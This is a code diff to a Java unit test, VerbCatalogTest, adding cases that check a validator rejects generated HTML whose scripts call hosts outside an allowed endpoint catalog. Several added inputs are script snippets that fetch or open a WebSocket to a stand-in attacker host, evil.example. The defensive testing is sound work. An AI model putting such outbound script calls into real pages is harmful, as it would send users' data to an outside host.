@@ -150,6 +150,13 @@ class VerbCatalogTest {
     void generatedHtmlOutsideTheCatalogFails() {
         assertFalse(VerbCatalog.outsideCatalog("<script>fetch(\"/not-a-verb\")</script>").isEmpty());
         assertTrue(VerbCatalog.outsideCatalog("<script>fetch(\"/store\", {method:\"POST\"})</script>").isEmpty());
+        assertFalse(VerbCatalog.outsideCatalog("<script>fetch(\"https://evil.example/store\")</script>").isEmpty());
+        assertFalse(VerbCatalog.outsideCatalog("<script>fetch(\"http://evil.example\")</script>").isEmpty());
+        assertFalse(VerbCatalog.outsideCatalog("<script>new WebSocket(\"ws://evil.example\")</script>").isEmpty());
+        assertFalse(VerbCatalog.outsideCatalog("<script>fetch(\"//evil.example/store\")</script>").isEmpty());
+        assertFalse(VerbCatalog.outsideCatalog("<script>fetch(base + \"/store\")</script>").isEmpty());
+        assertTrue(VerbCatalog.outsideCatalog(
+                "<script>fetch(\"/store\" + location.search, {method:\"POST\"})</script>").isEmpty());
     }
 
     private static Set<String> names(List<VerbCatalog.Row> rows) {
